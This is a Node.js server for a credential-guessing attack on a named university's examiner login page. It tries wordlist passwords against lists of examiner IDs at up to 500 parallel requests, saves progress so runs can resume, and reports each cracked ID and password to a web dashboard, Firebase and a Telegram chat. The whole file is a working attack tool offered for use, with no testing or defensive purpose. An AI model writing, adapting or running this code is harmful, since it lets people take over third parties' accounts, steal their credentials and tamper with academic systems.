require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const admin = require('firebase-admin');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');

const writeFileAsync = promisify(fs.writeFile);
const readFileAsync = promisify(fs.readFile);

// ========== CONFIGURATION ==========
const PORT = process.env.PORT || 3000;
let LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
if (!LOGIN_URL.startsWith('http')) LOGIN_URL = 'https://' + LOGIN_URL;
const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';
const TOTAL_CONCURRENCY = parseInt(process.env.TOTAL_CONCURRENCY) || 500;   // total parallel requests
const PARALLEL_EXAMINERS = parseInt(process.env.PARALLEL_EXAMINERS) || 5;   // how many examiners to attack simultaneously
const REQUEST_TIMEOUT = parseInt(process.env.REQUEST_TIMEOUT) || 3000;       // 3 seconds
const CHECKPOINT_INTERVAL = 1000;    // save checkpoint every 1000 attempts per examiner
const PROGRESS_INTERVAL = 500;       // emit progress every 500 attempts
const MEMORY_REPORT_INTERVAL = 5000; // send RAM usage every 5s

// Calculate concurrency per examiner
const PER_EXAMINER_CONCURRENCY = Math.max(1, Math.floor(TOTAL_CONCURRENCY / PARALLEL_EXAMINERS));
console.log(`⚙️ Total concurrency: ${TOTAL_CONCURRENCY}, Parallel examiners: ${PARALLEL_EXAMINERS}, Per‑examiner: ${PER_EXAMINER_CONCURRENCY}`);

// ========== FIREBASE (optional) ==========
let db = null;
let useFirebase = false;
let bot = null;

try {
  if (process.env.FIREBASE_CREDENTIALS_BASE64) {
    const decoded = Buffer.from(process.env.FIREBASE_CREDENTIALS_BASE64, 'base64').toString('utf8');
    const serviceAccount = JSON.parse(decoded);
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
    db = admin.firestore();
    useFirebase = true;
    console.log('✅ Firebase connected');
  } else {
    console.log('⚠️ No Firebase credentials – using local checkpoint.json');
  }
} catch (err) {
  console.log('⚠️ Firebase init failed – local checkpoint');
}

if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
  console.log('✅ Telegram ready');
}

// ========== EXPRESS & SOCKET.IO ==========
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
app.use(express.static('public'));

// ========== GLOBAL STATE ==========
let isRunning = false;
let isPaused = false;
let examinerIds = [];
let passwords = [];
let totalExaminers = 0;
let successes = new Map(); // examinerId -> password
let speedStats = { attempts: 0, startTime: null };
let lastProgressUpdate = 0;
let lastCheckpointSave = 0;

// Per‑examiner state (for checkpoint and progress)
let examinerCheckpoints = new Map(); // examinerId -> { passwordIndex, finished }

// HTTP Agent with keep‑alive
const agent = new (require('http').Agent)({ keepAlive: true, maxSockets: TOTAL_CONCURRENCY });
const httpsAgent = new (require('https').Agent)({ keepAlive: true, maxSockets: TOTAL_CONCURRENCY });
const axiosInstance = axios.create({
  timeout: REQUEST_TIMEOUT,
  headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' },
  httpAgent: agent,
  httpsAgent: httpsAgent
});

// ========== LOAD FILES ==========
function loadExaminers() {
  const fullPath = path.resolve(EXAMINER_FILE);
  if (!fs.existsSync(fullPath)) {
    fs.writeFileSync(fullPath, JSON.stringify(['EC1032506'], null, 2));
  }
  const data = fs.readFileSync(fullPath, 'utf8');
  examinerIds = JSON.parse(data);
  totalExaminers = examinerIds.length;
  console.log(`✅ Loaded ${totalExaminers} examiners`);
}

function loadPasswords() {
  const fullPath = path.resolve(PASSWORD_FILE);
  if (!fs.existsSync(fullPath)) {
    fs.writeFileSync(fullPath, 'admin123\npassword\n123456\n');
  }
  const content = fs.readFileSync(fullPath, 'utf8');
  passwords = content.split(/\r?\n/).filter(l => l.trim().length > 0);
  console.log(`✅ Loaded ${passwords.length} passwords (${(content.length / 1024 / 1024).toFixed(2)} MB)`);
}

// ========== CHECKPOINT (with per‑examiner data) ==========
async function saveCheckpoint() {
  const successesObj = Object.fromEntries(successes);
  const perExaminer = {};
  for (const [id, data] of examinerCheckpoints.entries()) {
    perExaminer[id] = { passwordIndex: data.passwordIndex };
  }
  const checkpointData = {
    successes: successesObj,
    perExaminer,
    updatedAt: new Date().toISOString(),
    status: isPaused ? 'paused' : (isRunning ? 'running' : 'stopped')
  };
  if (useFirebase) {
    try {
      await db.collection('checkpoint').doc('current').set(checkpointData, { merge: true });
      return;
    } catch (err) {
      console.error('Firebase checkpoint save failed', err.message);
    }
  }
  try {
    await writeFileAsync('./checkpoint.json', JSON.stringify(checkpointData, null, 2));
  } catch (err) {
    console.error('Local checkpoint save failed:', err.message);
  }
}

async function loadCheckpoint() {
  let checkpointData = null;
  if (useFirebase) {
    try {
      const doc = await db.collection('checkpoint').doc('current').get();
      if (doc.exists) checkpointData = doc.data();
    } catch (err) {}
  }
  if (!checkpointData && fs.existsSync('./checkpoint.json')) {
    try {
      const content = await readFileAsync('./checkpoint.json', 'utf8');
      checkpointData = JSON.parse(content);
    } catch (err) {}
  }
  if (checkpointData) {
    if (checkpointData.successes) {
      successes = new Map(Object.entries(checkpointData.successes));
    }
    if (checkpointData.perExaminer) {
      for (const [id, data] of Object.entries(checkpointData.perExaminer)) {
        examinerCheckpoints.set(id, { passwordIndex: data.passwordIndex, finished: false });
      }
    }
    console.log(`📌 Loaded checkpoint: ${successes.size} successes, ${examinerCheckpoints.size} examiners have state`);
  } else {
    console.log('📌 No previous checkpoint – starting fresh');
  }
}

async function loadExistingSuccesses() {
  if (!useFirebase) return;
  try {
    const snapshot = await db.collection('successful_logins').get();
    snapshot.forEach(doc => {
      const { examinerId, password } = doc.data();
      successes.set(examinerId, password);
    });
    console.log(`📦 Loaded ${successes.size} previous successes from Firebase`);
  } catch (err) {}
}

// ========== LOGIN ATTEMPT ==========
async function tryLogin(examinerId, password) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);
  try {
    const res = await axiosInstance.post(LOGIN_URL, {
      loginType: LOGIN_TYPE,
      userid: examinerId,
      password: password
    }, { signal: controller.signal });
    clearTimeout(timeoutId);
    speedStats.attempts++;
    return { success: !res.data.includes('Invalid'), password };
  } catch (err) {
    clearTimeout(timeoutId);
    speedStats.attempts++;
    if (speedStats.attempts % 1000 === 0) {
      console.error(`Request error: ${err.code || err.message}`);
    }
    return { success: false };
  }
}

// ========== PROCESS SINGLE EXAMINER (runs in parallel) ==========
async function processExaminer(examinerId, startPwdIdx) {
  let foundPassword = null;
  let pwdIdx = startPwdIdx;
  const total = passwords.length;
  let localAttempts = 0;
  const perExaminerConcurrency = PER_EXAMINER_CONCURRENCY;

  while (pwdIdx < total && !foundPassword && isRunning && !isPaused) {
    const batch = passwords.slice(pwdIdx, pwdIdx + perExaminerConcurrency);
    const promises = batch.map(pwd => tryLogin(examinerId, pwd));
    const results = await Promise.all(promises);

    for (let i = 0; i < results.length; i++) {
      if (results[i].success) {
        foundPassword = results[i].password;
        break;
      }
    }
    pwdIdx += batch.length;
    localAttempts += batch.length;
    // Update per‑examiner checkpoint
    examinerCheckpoints.set(examinerId, { passwordIndex: pwdIdx });

    // Periodic global progress update (throttled)
    const totalAttemptsNow = speedStats.attempts;
    if (totalAttemptsNow - lastProgressUpdate >= PROGRESS_INTERVAL) {
      const elapsed = (Date.now() - speedStats.startTime) / 1000;
      const speed = elapsed > 0 ? Math.round(totalAttemptsNow / elapsed) : 0;
      io.emit('progress', {
        examinerId,
        passwordIndex: pwdIdx,
        totalPasswords: total,
        speed
      });
      lastProgressUpdate = totalAttemptsNow;
    }

    // Save checkpoint every CHECKPOINT_INTERVAL attempts globally
    if (totalAttemptsNow - lastCheckpointSave >= CHECKPOINT_INTERVAL) {
      lastCheckpointSave = totalAttemptsNow;
      saveCheckpoint().catch(e => console.error('Checkpoint save error:', e.message));
    }
  }

  if (foundPassword) {
    successes.set(examinerId, foundPassword);
    io.emit('success', { examinerId, password: foundPassword, time: new Date().toISOString() });
    if (useFirebase) {
      await db.collection('successful_logins').add({
        examinerId,
        password: foundPassword,
        timestamp: admin.firestore.FieldValue.serverTimestamp()
      }).catch(e => console.error('Firestore error:', e.message));
    }
    if (bot) {
      await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `✅ ${examinerId} : ${foundPassword}`)
        .catch(e => console.error('Telegram error:', e.message));
    }
    console.log(`✅ Found for ${examinerId}`);
  } else {
    console.log(`❌ No password found for ${examinerId} (all ${total} tried)`);
  }
  examinerCheckpoints.set(examinerId, { passwordIndex: pwdIdx, finished: true });
  return foundPassword;
}

// ========== MAIN ATTACK LOOP (parallel examiners) ==========
async function startAttack() {
  if (isRunning) return;
  if (passwords.length === 0) {
    io.emit('status', { running: false, paused: false, message: 'No passwords loaded' });
    return;
  }
  isRunning = true;
  isPaused = false;
  speedStats.attempts = 0;
  speedStats.startTime = Date.now();
  lastProgressUpdate = 0;
  lastCheckpointSave = 0;
  io.emit('status', { running: true, paused: false });
  console.log('🚀 Attack started (parallel examiners)');

  // Determine which examiners still need to be processed
  const remainingExaminers = examinerIds.filter(id => !successes.has(id));
  let examinerIndexMap = new Map(); // id -> original index for progress
  examinerIds.forEach((id, idx) => examinerIndexMap.set(id, idx));

  // Process in parallel batches of PARALLEL_EXAMINERS
  for (let i = 0; i < remainingExaminers.length; i += PARALLEL_EXAMINERS) {
    if (!isRunning || isPaused) break;
    const batch = remainingExaminers.slice(i, i + PARALLEL_EXAMINERS);
    const promises = batch.map(async (examinerId) => {
      // Get last saved password index from checkpoint
      let startIdx = 0;
      if (examinerCheckpoints.has(examinerId)) {
        startIdx = examinerCheckpoints.get(examinerId).passwordIndex;
      }
      await processExaminer(examinerId, startIdx);
    });
    await Promise.all(promises);
    // After each batch of examiners, save checkpoint
    await saveCheckpoint();
    // Emit overall progress (number of examiners completed)
    const completedCount = successes.size;
    const percent = totalExaminers ? (completedCount / totalExaminers * 100) : 0;
    io.emit('overallProgress', {
      completed: completedCount,
      total: totalExaminers,
      percent: Math.round(percent)
    });
  }

  isRunning = false;
  await saveCheckpoint();
  io.emit('status', { running: false, paused: false });
  console.log('🏁 Attack finished');
}

// ========== MEMORY REPORTING ==========
setInterval(() => {
  if (io.engine.clientsCount > 0) {
    const memUsage = process.memoryUsage();
    io.emit('memory', {
      rss: Math.round(memUsage.rss / 1024 / 1024),
      heapTotal: Math.round(memUsage.heapTotal / 1024 / 1024),
      heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024)
    });
  }
}, MEMORY_REPORT_INTERVAL);

// ========== SOCKET.IO EVENTS ==========
io.on('connection', (socket) => {
  console.log('🖥️ Web UI connected');
  // Send initial data
  socket.emit('init', {
    totalExaminers,
    successes: Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd })),
    totalPasswords: passwords.length,
    isRunning,
    isPaused,
    parallelExaminers: PARALLEL_EXAMINERS,
    perExaminerConcurrency: PER_EXAMINER_CONCURRENCY
  });
  // Send overall progress
  const completedCount = successes.size;
  socket.emit('overallProgress', {
    completed: completedCount,
    total: totalExaminers,
    percent: totalExaminers ? Math.round(completedCount / totalExaminers * 100) : 0
  });

  socket.on('start', () => startAttack());
  socket.on('pause', async () => {
    if (isRunning) {
      isPaused = true;
      isRunning = false;
      await saveCheckpoint();
      io.emit('status', { running: false, paused: true });
      console.log('⏸ Paused');
    }
  });
  socket.on('resume', () => startAttack());
  socket.on('stop', async () => {
    isRunning = false;
    isPaused = false;
    successes.clear();
    examinerCheckpoints.clear();
    await saveCheckpoint();
    io.emit('init', {
      totalExaminers,
      successes: [],
      totalPasswords: passwords.length,
      isRunning: false,
      isPaused: false,
      parallelExaminers: PARALLEL_EXAMINERS,
      perExaminerConcurrency: PER_EXAMINER_CONCURRENCY
    });
    io.emit('overallProgress', { completed: 0, total: totalExaminers, percent: 0 });
    console.log('⏹ Stopped and reset');
  });
});

// ========== START SERVER ==========
(async () => {
  loadExaminers();
  loadPasswords();
  await loadExistingSuccesses();
  await loadCheckpoint();
  server.listen(PORT, () => {
    console.log(`✅ Server at http://localhost:${PORT}`);
    console.log(`⚡ Total concurrency: ${TOTAL_CONCURRENCY} | Parallel examiners: ${PARALLEL_EXAMINERS} | Per‑examiner: ${PER_EXAMINER_CONCURRENCY}`);
    console.log(`💾 Memory limit: 400 MB (current RSS ~${Math.round(process.memoryUsage().rss / 1024 / 1024)} MB)`);
  });
})();
